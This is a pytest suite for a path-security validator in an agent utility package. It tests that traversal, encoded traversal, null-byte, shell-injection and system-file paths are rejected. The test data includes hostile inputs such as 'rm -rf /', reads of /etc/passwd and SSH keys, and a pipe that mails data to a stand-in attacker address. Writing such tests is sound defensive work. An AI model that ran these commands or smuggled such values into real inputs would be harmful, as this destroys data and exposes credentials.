#!/usr/bin/env python3
"""
Comprehensive tests for the SecurePathValidator security component.

Tests all aspects of path security including:
- Directory traversal prevention
- System directory access restrictions
- Path validation and normalization
- Platform-specific security measures
"""

import pytest
import platform
from pathlib import Path
import tempfile
import os
from metis_agent.utils.path_security import (
    SecurePathValidator, SecurityError, validate_secure_path, is_path_safe
)


class TestSecurePathValidator:
    """Test suite for SecurePathValidator class."""
    
    def setup_method(self):
        """Setup test fixtures."""
        self.validator = SecurePathValidator()
        self.temp_dir = tempfile.mkdtemp()
        self.is_windows = platform.system() == 'Windows'
    
    def teardown_method(self):
        """Clean up test fixtures."""
        import shutil
        try:
            shutil.rmtree(self.temp_dir)
        except:
            pass
    
    # Directory Traversal Tests
    def test_directory_traversal_prevention(self):
        """Test prevention of directory traversal attacks."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "./../../../etc/shadow",
            "normal_file.txt/../../../etc/passwd",
            "subdir/../../etc/passwd",
            "../../../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\..\\windows\\system32",
        ]
        
        for malicious_path in malicious_paths:
            with pytest.raises(SecurityError, match="suspicious pattern|Path outside"):
                self.validator.validate_path(malicious_path)
    
    def test_url_encoded_traversal_prevention(self):
        """Test prevention of URL-encoded directory traversal."""
        malicious_paths = [
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5C..%5C..%5Cwindows%5Csystem32",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        ]
        
        for malicious_path in malicious_paths:
            with pytest.raises(SecurityError, match="suspicious pattern"):
                self.validator.validate_path(malicious_path)
    
    def test_system_directory_restrictions(self):
        """Test restrictions on system directories."""
        if self.is_windows:
            restricted_paths = [
                "C:\\Windows\\System32\\config\\sam",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "C:\\Program Files\\test.exe",
                "C:\\System Volume Information\\test",
                "C:\\hiberfil.sys",
                "C:\\pagefile.sys",
            ]
        else:
            restricted_paths = [
                "/etc/passwd",
                "/etc/shadow",
                "/proc/version",
                "/sys/kernel/debug",
                "/dev/null",
                "/boot/vmlinuz",
                "/root/.ssh/id_rsa",
                "/usr/bin/sudo",
                "/var/log/auth.log",
            ]
        
        for restricted_path in restricted_paths:
            if os.path.exists(Path(restricted_path).parent):  # Only test if parent exists
                with pytest.raises(SecurityError, match="restricted directory"):
                    self.validator.validate_path(restricted_path)
    
    def test_safe_path_validation(self):
        """Test that safe paths pass validation."""
        safe_paths = [
            "normal_file.txt",
            "subdir/file.txt",
            "documents/readme.md",
            os.path.join(self.temp_dir, "test_file.txt"),
            "./local_file.txt",
            "data/config.json",
        ]
        
        for safe_path in safe_paths:
            try:
                result = self.validator.validate_path(safe_path, self.temp_dir)
                assert isinstance(result, Path)
                assert result.is_absolute()
            except SecurityError as e:
                pytest.fail(f"Safe path '{safe_path}' was rejected: {e}")
    
    def test_base_directory_enforcement(self):
        """Test base directory enforcement."""
        base_dir = self.temp_dir
        
        # Paths within base directory should pass
        safe_paths = [
            "file.txt",
            "subdir/file.txt",
            "./local_file.txt",
        ]
        
        for safe_path in safe_paths:
            result = self.validator.validate_path(safe_path, base_dir)
            assert str(result).startswith(str(Path(base_dir).resolve()))
        
        # Paths outside base directory should fail
        outside_paths = [
            "../outside_file.txt",
            "../../etc/passwd",
            "/tmp/outside_file.txt" if not self.is_windows else "C:\\temp\\outside_file.txt",
        ]
        
        for outside_path in outside_paths:
            with pytest.raises(SecurityError, match="outside.*base directory|suspicious pattern"):
                self.validator.validate_path(outside_path, base_dir)
    
    def test_null_byte_prevention(self):
        """Test null byte injection prevention."""
        malicious_paths = [
            "normal_file.txt\x00hidden_content",
            "file\x00.txt",
            "subdir/file.txt\x00../../../etc/passwd",
        ]
        
        for malicious_path in malicious_paths:
            with pytest.raises(SecurityError, match="suspicious pattern"):
                self.validator.validate_path(malicious_path)
    
    def test_shell_injection_prevention(self):
        """Test prevention of shell injection through paths."""
        malicious_paths = [
            "file.txt; rm -rf /",
            "file.txt && cat /etc/passwd",
            "file.txt | mail hacker@evil.com",
            "file.txt > /dev/null",
            "file.txt $(cat /etc/passwd)",
            "file.txt `whoami`",
        ]
        
        for malicious_path in malicious_paths:
            with pytest.raises(SecurityError, match="suspicious pattern"):
                self.validator.validate_path(malicious_path)
    
    def test_path_length_limits(self):
        """Test path length validation."""
        # Create an extremely long path
        if self.is_windows:
            max_length = 260
        else:
            max_length = 4096
        
        long_path = "a" * (max_length + 100)
        
        with pytest.raises(SecurityError, match="too long"):
            self.validator.validate_path(long_path)
    
    def test_allowed_base_directories(self):
        """Test allowed base directory management."""
        # Test adding custom allowed directory
        custom_dir = self.temp_dir
        self.validator.add_allowed_base_dir(custom_dir)
        
        # Should now allow paths in this directory
        test_path = os.path.join(custom_dir, "test_file.txt")
        result = self.validator.validate_path(test_path)
        assert isinstance(result, Path)
        
        # Test removing allowed directory
        self.validator.remove_allowed_base_dir(custom_dir)
        
        # May now reject paths (depending on other allowed dirs)
        # This test is platform and environment dependent
    
    def test_symlink_handling(self):
        """Test symlink security handling."""
        if self.is_windows:
            pytest.skip("Symlink tests not applicable on Windows")
        
        # Create test files and symlinks
        target_file = os.path.join(self.temp_dir, "target.txt")
        symlink_file = os.path.join(self.temp_dir, "symlink.txt")
        
        with open(target_file, 'w') as f:
            f.write("test content")
        
        os.symlink(target_file, symlink_file)
        
        # Symlinks should be handled securely (current implementation allows them)
        try:
            result = self.validator.validate_path(symlink_file, self.temp_dir)
            assert isinstance(result, Path)
        except SecurityError:
            # If symlinks are blocked, that's also acceptable
            pass
    
    def test_windows_specific_patterns(self):
        """Test Windows-specific security patterns."""
        if not self.is_windows:
            pytest.skip("Windows-specific tests")
        
        windows_malicious = [
            "CON",
            "PRN", 
            "AUX",
            "NUL",
            "COM1",
            "LPT1",
            "file.txt:",
            "file.txt:ads",  # Alternate Data Streams
            "\\\\server\\share\\file",  # UNC paths
            "\\\\?\\C:\\very\\long\\path",
        ]
        
        for malicious_path in windows_malicious:
            with pytest.raises(SecurityError):
                self.validator.validate_path(malicious_path)
    
    def test_unix_specific_patterns(self):
        """Test Unix-specific security patterns."""
        if self.is_windows:
            pytest.skip("Unix-specific tests")
        
        unix_malicious = [
            "/dev/zero",
            "/proc/self/mem",
            "/sys/firmware/efi",
            "~root/.ssh/id_rsa",
            "$HOME/.ssh/id_rsa",
        ]
        
        for malicious_path in unix_malicious:
            with pytest.raises(SecurityError):
                self.validator.validate_path(malicious_path)


class TestPathSecurityIntegration:
    """Integration tests for path security with file operations."""
    
    def setup_method(self):
        """Setup test fixtures."""
        self.temp_dir = tempfile.mkdtemp()
        self.validator = SecurePathValidator()
    
    def teardown_method(self):
        """Clean up test fixtures."""
        import shutil
        try:
            shutil.rmtree(self.temp_dir)
        except:
            pass
    
    def test_file_operation_security(self):
        """Test path security in file operations."""
        # Create a safe file
        safe_file = os.path.join(self.temp_dir, "safe_file.txt")
        with open(safe_file, 'w') as f:
            f.write("safe content")
        
        # Test reading safe file
        validated_path = self.validator.validate_path(safe_file)
        assert os.path.exists(validated_path)
        
        # Test malicious file operations
        malicious_paths = [
            "../../../etc/passwd",
            self.temp_dir + "/../../../etc/passwd",
        ]
        
        for malicious_path in malicious_paths:
            with pytest.raises(SecurityError):
                self.validator.validate_path(malicious_path, self.temp_dir)
    
    def test_directory_creation_security(self):
        """Test security in directory creation operations."""
        # Safe directory creation
        safe_dir = os.path.join(self.temp_dir, "safe_subdir")
        validated_path = self.validator.validate_path(safe_dir, self.temp_dir)
        assert str(validated_path).startswith(str(Path(self.temp_dir).resolve()))
        
        # Malicious directory creation
        malicious_dirs = [
            "../malicious_dir",
            "../../tmp/malicious",
        ]
        
        for malicious_dir in malicious_dirs:
            full_path = os.path.join(self.temp_dir, malicious_dir)
            with pytest.raises(SecurityError):
                self.validator.validate_path(full_path, self.temp_dir)
    
    def test_path_normalization(self):
        """Test path normalization security."""
        test_cases = [
            ("./file.txt", "file.txt"),
            ("subdir/../file.txt", "file.txt"),
            ("./subdir/./file.txt", os.path.join("subdir", "file.txt")),
        ]
        
        for input_path, expected_component in test_cases:
            try:
                result = self.validator.validate_path(input_path, self.temp_dir)
                # Check that the normalized path contains expected component
                assert expected_component in str(result).replace('\\', '/')
            except SecurityError:
                # Some normalization might be blocked for security
                pass


class TestConvenienceFunctions:
    """Test convenience functions for path security."""
    
    def setup_method(self):
        """Setup test fixtures."""
        self.temp_dir = tempfile.mkdtemp()
    
    def teardown_method(self):
        """Clean up test fixtures."""
        import shutil
        try:
            shutil.rmtree(self.temp_dir)
        except:
            pass
    
    def test_validate_secure_path_function(self):
        """Test validate_secure_path convenience function."""
        # Safe path
        safe_path = os.path.join(self.temp_dir, "safe_file.txt")
        result = validate_secure_path(safe_path, self.temp_dir)
        assert isinstance(result, Path)
        
        # Unsafe path
        with pytest.raises(SecurityError):
            validate_secure_path("../../../etc/passwd", self.temp_dir)
    
    def test_is_path_safe_function(self):
        """Test is_path_safe convenience function."""
        # Safe path
        safe_path = os.path.join(self.temp_dir, "safe_file.txt")
        assert is_path_safe(safe_path, self.temp_dir) == True
        
        # Unsafe paths
        unsafe_paths = [
            "../../../etc/passwd",
            "file.txt\x00hidden",
            "file.txt; rm -rf /",
        ]
        
        for unsafe_path in unsafe_paths:
            assert is_path_safe(unsafe_path, self.temp_dir) == False
    
    def test_performance_with_many_paths(self):
        """Test performance with multiple path validations."""
        import time
        
        paths = [os.path.join(self.temp_dir, f"file_{i}.txt") for i in range(100)]
        
        start_time = time.time()
        for path in paths:
            try:
                validate_secure_path(path, self.temp_dir)
            except SecurityError:
                pass
        end_time = time.time()
        
        # Should complete reasonably quickly (< 1 second for 100 paths)
        assert (end_time - start_time) < 1.0


class TestErrorHandling:
    """Test error handling and edge cases."""
    
    def test_invalid_input_types(self):
        """Test handling of invalid input types."""
        validator = SecurePathValidator()
        
        invalid_inputs = [
            None,
            123,
            [],
            {},
            Path("test"),  # Should handle Path objects by converting to string
        ]
        
        for invalid_input in invalid_inputs:
            if isinstance(invalid_input, Path):
                # Path objects should be handled
                try:
                    result = validator.validate_path(str(invalid_input))
                    assert isinstance(result, Path)
                except SecurityError:
                    # Security rejection is acceptable
                    pass
            else:
                with pytest.raises((ValueError, SecurityError)):
                    validator.validate_path(invalid_input)
    
    def test_empty_path_handling(self):
        """Test handling of empty paths."""
        validator = SecurePathValidator()
        
        with pytest.raises(ValueError, match="must be a non-empty string"):
            validator.validate_path("")
        
        with pytest.raises(ValueError, match="must be a non-empty string"):
            validator.validate_path("   ")
    
    def test_error_message_security(self):
        """Test that error messages don't leak sensitive information."""
        validator = SecurePathValidator()
        
        malicious_path = "../../../etc/passwd"
        
        with pytest.raises(SecurityError) as exc_info:
            validator.validate_path(malicious_path)
        
        error_message = str(exc_info.value)
        # Error message should be informative but not leak the full malicious path
        assert "security" in error_message.lower() or "restricted" in error_message.lower()


if __name__ == "__main__":
    # Run basic tests if script is executed directly
    pytest.main([__file__, "-v"])